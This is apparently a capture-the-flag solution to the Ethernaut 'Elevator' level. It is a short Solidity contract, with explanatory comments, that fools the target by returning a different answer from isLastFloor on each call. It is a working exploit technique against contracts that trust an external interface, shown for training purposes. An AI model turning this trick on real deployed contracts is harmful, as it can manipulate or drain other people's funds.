// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x325Cbb3073735B971c15d95c628849f260104F52

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// because the original contract only specify the interface of the Building contract
// you can define your own Building contract
// then because the goTo() method makes two calls to the isLastFloor() method
// you can return one value on the first call and then change it and return
// a different value in the next call, that way you trick the condition

// use "view" or "pure" in the interface functions to avoid their from changing the state

interface Elevator {
    function goTo(uint256) external;
}

contract Building {
    bool public called = true;
    Elevator public elevator =
        Elevator(0x325Cbb3073735B971c15d95c628849f260104F52);

    function isLastFloor(uint256 _floor) external returns (bool) {
        _floor;
        called = !called;
        return called;
    }

    function goTo(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
